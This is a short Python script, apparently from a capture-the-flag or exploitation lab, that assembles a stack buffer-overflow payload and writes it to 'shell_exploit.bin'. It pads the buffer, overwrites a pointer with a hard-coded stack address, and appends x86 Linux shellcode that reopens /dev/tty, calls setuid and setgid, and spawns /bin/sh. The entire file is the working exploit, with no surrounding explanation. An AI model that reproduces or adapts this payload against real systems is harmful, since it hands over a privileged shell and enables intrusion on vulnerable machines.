
import struct
a_bus1 = 'a' * 32
a_bus1 = a_bus1.encode('utf-8')

new_ecx_pointer = struct.pack("I", 0xffffd5e0)

a_bus2 = 'a' * 24
a_bus2 = a_bus2.encode('utf-8')

shell_pointer = struct.pack("I", 0xffffd5e0)

nop = 'a' * 32
nop = nop.encode('utf-8')

shellcode = b"\x83\xc4\x18\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x6a\x17\x58\x31\xdb\xcd\x80\x6a\x2e\x58\x53\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"

string = a_bus1 + new_ecx_pointer + a_bus2 + shell_pointer + nop + shellcode
file = open("shell_exploit.bin", "wb")
file.write(string)
file.close()

